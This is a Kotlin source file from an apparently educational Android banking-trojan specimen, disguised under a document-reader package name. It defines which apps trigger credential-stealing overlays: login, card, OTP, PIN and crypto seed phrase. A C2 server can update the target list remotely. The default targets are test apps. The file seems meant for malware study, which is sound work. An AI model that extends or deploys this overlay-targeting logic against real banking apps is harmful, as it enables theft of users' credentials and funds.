package com.docreader.lite.reader

/**
 * Target list — which apps trigger overlay attack.
 *
 * Real banker: C2 pushes "injects" list of 300-800 banking app packages.
 * Each has custom overlay HTML matching that bank's login UI.
 *
 * This specimen: configurable target list. Starts with test apps.
 * C2 can push updates via UPDATE_TARGETS command.
 */
object Targets {

    data class Target(
        val packageName: String,
        val name: String,
        val overlayType: OverlayType = OverlayType.LOGIN,
    )

    enum class OverlayType {
        LOGIN,       // Username + password
        CARD,        // Card details
        OTP,         // Enter verification code
        PIN,         // PIN pad
        SEED,        // Crypto recovery phrase
    }

    private val targets = mutableListOf(
        // Default targets — test/training apps (no real institutions)
        Target("com.dvbank.example", "DVBank", OverlayType.LOGIN),
        Target("com.example.banking", "Example Bank", OverlayType.LOGIN),
        Target("com.test.wallet", "Test Wallet", OverlayType.SEED),
        Target("com.example.crypto", "CryptoTest", OverlayType.SEED),
        Target("com.test.payments", "PayTest", OverlayType.CARD),
    )

    fun match(packageName: String): Target? {
        return targets.firstOrNull { it.packageName == packageName }
    }

    fun addTarget(pkg: String, name: String, type: OverlayType = OverlayType.LOGIN) {
        targets.add(Target(pkg, name, type))
    }

    fun updateAll(newTargets: List<Target>) {
        targets.clear()
        targets.addAll(newTargets)
    }

    fun getAll(): List<Target> = targets.toList()
}
